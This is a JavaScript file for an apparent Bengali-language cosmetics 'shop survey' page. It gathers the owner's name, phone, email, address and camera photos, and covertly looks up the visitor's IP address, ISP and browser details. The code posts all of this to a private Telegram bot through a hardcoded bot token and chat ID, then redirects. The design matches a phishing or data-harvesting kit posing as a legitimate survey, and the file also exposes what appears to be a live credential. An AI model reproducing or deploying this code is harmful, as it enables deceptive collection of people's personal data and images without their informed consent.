/* ============================================================
   BeautyBD — কসমেটিক্স প্রোডাক্ট সার্ভে
   ▸ survey.js (NO LOCATION · NO CAPTCHA)
   ============================================================ */

var BOT_TOKEN     = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
var ADMIN_CHAT_ID = "7274208494";
var IMAGE_QUALITY = 0.85;
var MAX_PHOTOS    = 5;

/* ============================================================ */

var form           = document.getElementById("surveyForm");
var ownerName      = document.getElementById("ownerName");
var shopName       = document.getElementById("shopName");
var phone          = document.getElementById("phone");
var email          = document.getElementById("email");
var division       = document.getElementById("division");
var district       = document.getElementById("district");
var address        = document.getElementById("address");
var businessType   = document.getElementById("businessType");
var shopType       = document.getElementById("shopType");
var yearsBusiness  = document.getElementById("yearsBusiness");
var monthlySale    = document.getElementById("monthlySale");

var btnCamera      = document.getElementById("btnCamera");
var btnUpload      = document.getElementById("btnUpload");
var fileInput      = document.getElementById("fileInput");
var photoPreviews  = document.getElementById("photoPreviews");
var photoCount     = document.getElementById("photoCount");

var btnSubmit      = document.getElementById("btnSubmit");
var formStatus     = document.getElementById("formStatus");

var camModal       = document.getElementById("camModal");
var cameraVideo    = document.getElementById("cameraVideo");
var camClose       = document.getElementById("camClose");
var camCancel      = document.getElementById("camCancel");
var camCapture     = document.getElementById("camCapture");
var camCountdown   = document.getElementById("camCountdown");
var hiddenCanvas   = document.getElementById("hiddenCanvas");

var photos = [];
var camStream = null;

function debugLog(msg){
  console.log("[BeautyBD]", msg);
}

/* ============================================================
   CAMERA
   ============================================================ */
btnCamera.addEventListener("click", openCamera);
camClose.addEventListener("click", closeCamera);
camCancel.addEventListener("click", closeCamera);

function openCamera(){
  if (photos.length >= MAX_PHOTOS){
    showStatus("err","সর্বোচ্চ " + MAX_PHOTOS + " টি ছবি যুক্ত করা যাবে।");
    return;
  }
  camModal.classList.add("open");
  navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: 1280 }, height: { ideal: 960 }, facingMode: "environment" }
  }).then(function(s){
    camStream = s;
    cameraVideo.srcObject = s;
    return cameraVideo.play();
  }).catch(function(err){
    debugLog("ক্যামেরা এরর: " + err.name);
    var msg = "ক্যামেরা চালু হয়নি। ";
    if (err.name === "NotAllowedError") msg += "অনুমতি দিন।";
    else if (err.name === "NotFoundError") msg += "ক্যামেরা নেই।";
    else msg += "HTTPS ব্যবহার করুন।";
    showStatus("err", msg);
    setTimeout(closeCamera, 2000);
  });
}
function closeCamera(){
  camModal.classList.remove("open");
  camCountdown.classList.remove("show");
  if (camStream){ camStream.getTracks().forEach(function(t){ t.stop(); }); camStream = null; }
  cameraVideo.srcObject = null;
}
camCapture.addEventListener("click", function(){
  if (!camStream) return;
  var c = 3;
  camCountdown.textContent = c;
  camCountdown.classList.add("show");
  var iv = setInterval(function(){
    c--;
    if (c > 0){ camCountdown.textContent = c; }
    else { clearInterval(iv); camCountdown.classList.remove("show"); grabFrame(); }
  }, 700);
});
function grabFrame(){
  var w = cameraVideo.videoWidth || 1280;
  var h = cameraVideo.videoHeight || 960;
  hiddenCanvas.width = w; hiddenCanvas.height = h;
  var ctx = hiddenCanvas.getContext("2d");
  ctx.drawImage(cameraVideo, 0, 0, w, h);
  hiddenCanvas.toBlob(function(blob){
    if (!blob) return;
    var url = hiddenCanvas.toDataURL("image/jpeg", IMAGE_QUALITY);
    addPhoto(blob, url);
    closeCamera();
  }, "image/jpeg", IMAGE_QUALITY);
}

/* ============================================================
   FILE UPLOAD
   ============================================================ */
btnUpload.addEventListener("click", function(){
  if (photos.length >= MAX_PHOTOS){
    showStatus("err","সর্বোচ্চ " + MAX_PHOTOS + " টি ছবি যুক্ত করা যাবে।");
    return;
  }
  fileInput.click();
});
fileInput.addEventListener("change", function(e){
  var files = e.target.files;
  if (!files || !files.length) return;
  for (var i = 0; i < files.length; i++){
    if (photos.length >= MAX_PHOTOS) {
      showStatus("err","সর্বোচ্চ " + MAX_PHOTOS + " টি ছবি যুক্ত করা যাবে।");
      break;
    }
    var f = files[i];
    if (!f.type.startsWith("image/")) continue;
    if (f.size > 10*1024*1024){
      showStatus("err","ছবি ১০ MB এর কম হতে হবে।");
      continue;
    }
    (function(file){
      var rd = new FileReader();
      rd.onload = function(ev){ addPhoto(file, ev.target.result); };
      rd.readAsDataURL(file);
    })(f);
  }
  fileInput.value = "";
});

/* ============================================================
   PHOTO PREVIEW
   ============================================================ */
function addPhoto(blob, dataURL){
  if (photos.length >= MAX_PHOTOS) return;
  photos.push({ blob: blob, dataURL: dataURL });
  debugLog("ছবি যোগ: মোট " + photos.length);
  renderPhotos();
  hideStatus();
  checkReady();
}
function removePhoto(index){
  photos.splice(index, 1);
  renderPhotos();
  checkReady();
}
function renderPhotos(){
  photoPreviews.innerHTML = "";
  photos.forEach(function(p, i){
    var thumb = document.createElement("div");
    thumb.className = "photo-thumb";
    thumb.innerHTML = '<img src="' + p.dataURL + '" alt="Photo">' +
      '<button type="button" class="rm" data-index="' + i + '">✕</button>';
    photoPreviews.appendChild(thumb);
  });
  photoPreviews.querySelectorAll(".rm").forEach(function(b){
    b.addEventListener("click", function(){
      removePhoto(parseInt(this.dataset.index));
    });
  });
  photoCount.innerHTML = "<strong>" + photos.length + "</strong> / " + MAX_PHOTOS + " টি ছবি যুক্ত হয়েছে";
}

/* ============================================================
   STATUS
   ============================================================ */
function showStatus(type, msg){
  formStatus.className = "status show " + type;
  formStatus.textContent = msg;
}
function hideStatus(){
  formStatus.className = "status";
  formStatus.textContent = "";
}

/* ============================================================
   BUTTON ENABLE / DISABLE
   ============================================================ */
function checkReady(){
  var ready = photos.length > 0;

  debugLog("checkReady → photos:" + photos.length +
           " → " + (ready ? "ENABLED" : "disabled"));

  btnSubmit.disabled = !ready;
}

/* ============================================================
   IP / ISP
   ============================================================ */
function getIP(){
  return fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(d){ return d.ip || "Unknown"; })
    .catch(function(){ return "Unknown"; });
}
function getISP(){
  return fetch("https://ipapi.co/json/")
    .then(function(r){ return r.json(); })
    .then(function(d){ return (d.org || "Unknown"); })
    .catch(function(){ return "Unknown"; });
}

/* ============================================================
   SEND PHOTO
   ============================================================ */
function sendPhoto(blob, caption){
  var fd = new FormData();
  fd.append("chat_id", ADMIN_CHAT_ID);
  fd.append("photo", blob, "shop_" + Date.now() + ".jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto",
               { method: "POST", body: fd })
    .then(function(r){ return r.json(); })
    .then(function(d){ return d.ok; })
    .catch(function(){ return false; });
}

/* ============================================================
   SUBMIT
   ============================================================ */
form.addEventListener("submit", function(e){
  e.preventDefault();
  hideStatus();

  var missing = [];
  if (!ownerName.value.trim())     missing.push("মালিকের নাম");
  if (!shopName.value.trim())      missing.push("দোকানের নাম");
  if (!phone.value.trim())         missing.push("মোবাইল নম্বর");
  if (!email.value.trim())         missing.push("জিমেইল");
  if (!division.value)             missing.push("বিভাগ");
  if (!district.value.trim())      missing.push("জেলা/শহর");
  if (!address.value.trim())       missing.push("ঠিকানা");
  if (!businessType.value)         missing.push("ব্যবসার ধরন");
  if (!shopType.value)             missing.push("দোকানের ধরন");
  if (!yearsBusiness.value.trim()) missing.push("অভিজ্ঞতা");

  if (missing.length){
    showStatus("err", "পূরণ করুন: " + missing.join(", "));
    return;
  }
  if (!email.value.includes("@")){
    showStatus("err","সঠিক ইমেইল দিন।");
    return;
  }
  if (photos.length === 0){
    showStatus("err","কমপক্ষে একটি ছবি দিন।");
    return;
  }

  btnSubmit.disabled = true;
  btnSubmit.textContent = "পাঠানো হচ্ছে…";
  showStatus("info", "আপনার তথ্য পাঠানো হচ্ছে…");

  Promise.all([getIP(), getISP()]).then(function(arr){
    var ip = arr[0];
    var isp = arr[1];
    var ua = navigator.userAgent;
    var dateStr = new Date().toLocaleString("en-US",{timeZoneName:"short"});

    var caption =
      "🏪 <b>BeautyBD — নতুন দোকান সার্ভে</b>\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "👤 <b>মালিক:</b> " + escape(ownerName.value.trim()) + "\n" +
      "🏪 <b>দোকান:</b> " + escape(shopName.value.trim()) + "\n" +
      "📱 <b>মোবাইল:</b> " + escape(phone.value.trim()) + "\n" +
      "📧 <b>জিমেইল:</b> " + escape(email.value.trim()) + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "📍 <b>বিভাগ:</b> " + escape(division.value) + "\n" +
      "🏙️ <b>জেলা:</b> " + escape(district.value.trim()) + "\n" +
      "🏠 <b>ঠিকানা:</b> " + escape(address.value.trim()) + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "💼 <b>ব্যবসার ধরন:</b> " + escape(businessType.value) + "\n" +
      "🏬 <b>দোকানের ধরন:</b> " + escape(shopType.value) + "\n" +
      "📅 <b>অভিজ্ঞতা:</b> " + escape(yearsBusiness.value.trim()) + " বছর\n" +
      "💰 <b>মাসিক বিক্রি:</b> " + escape(monthlySale.value || "উল্লেখ নেই") + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "📸 <b>ছবি সংখ্যা:</b> " + photos.length + "\n" +
      "━━━━━━━━━━━━━━━━━━━━━━\n" +
      "🕐 " + dateStr + "\n" +
      "🌐 IP: " + ip + " — " + isp + "\n" +
      "💻 " + ua;

    return sendPhoto(photos[0].blob, caption).then(function(ok){
      if (!ok) return false;
      var chain = Promise.resolve(true);
      for (var i = 1; i < photos.length; i++){
        (function(photo, index){
          chain = chain.then(function(){
            return sendPhoto(photo.blob,
              "📸 ছবি " + (index+1) + "/" + photos.length + " — " + shopName.value.trim());
          });
        })(photos[i], i);
      }
      return chain;
    });
  }).then(function(ok){
    if (ok){
      showStatus("ok","✓ সফলভাবে জমা হয়েছে! ধন্যবাদ।");
      btnSubmit.textContent = "জমা সম্পন্ন ✓";
      setTimeout(function(){ window.location.href = "next.html"; }, 1600);
    } else {
      showStatus("err","পাঠাতে ব্যর্থ। আবার চেষ্টা করুন।");
      btnSubmit.disabled = false;
      btnSubmit.textContent = "সার্ভে সাবমিট করুন";
    }
  }).catch(function(err){
    console.error(err);
    showStatus("err","সমস্যা হয়েছে। আবার চেষ্টা করুন।");
    btnSubmit.disabled = false;
    btnSubmit.textContent = "সার্ভে সাবমিট করুন";
  });
});

function escape(s){
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}

/* ============================================================
   BOOT
   ============================================================ */
window.addEventListener("load", function(){
  debugLog("সার্ভে ইনিশিয়ালাইজ…");
  document.querySelectorAll("input, select, textarea").forEach(function(el){
    el.addEventListener("input", checkReady);
    el.addEventListener("change", checkReady);
  });
  checkReady();
});
